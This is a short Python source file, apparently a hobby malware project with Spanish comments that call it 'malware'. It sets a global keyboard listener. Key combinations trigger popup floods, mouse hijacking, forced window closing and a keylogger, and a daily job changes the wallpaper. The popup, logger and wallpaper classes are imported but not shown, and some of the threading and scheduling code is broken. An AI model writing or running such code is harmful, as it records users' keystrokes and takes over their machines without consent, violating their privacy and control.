from pynput.keyboard import Listener
import os
import threading
from Classes import popup, logger, Background_Changer as bg
import schedule

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == "Key.esc": # mata el proceso y cierra el malware
        os.kill(os.getpid(), 9)

    if letter == "\\x18": # CTRL + X
        # agregar funcionalidad del malware

        pass 

    if letter == "\\x03": # CTRL + C
        # agregar funcionalidad del malware
        pp = popup.popupGenerator()
        t1 = threading.Thread(target=pp.start_popups(30))
        t2 = threading.Thread(target=pp.moveMouse)
        t3 = threading.Thread(target=pp.closeWindows)
        t1.start()
        t2.start()
        t3.start()

    if letter == "\\x16": # CTRL + V
        # agregar funcionalidad del malware
        kl = logger.KeyLogger()
        t4 = threading.Thread(target=kl.start())
        t4.start()

schedule.every().day.at('15:07').do(bg.change_Wallpaper)
with Listener(on_press=write_to_file) as ml:
    ml.join()

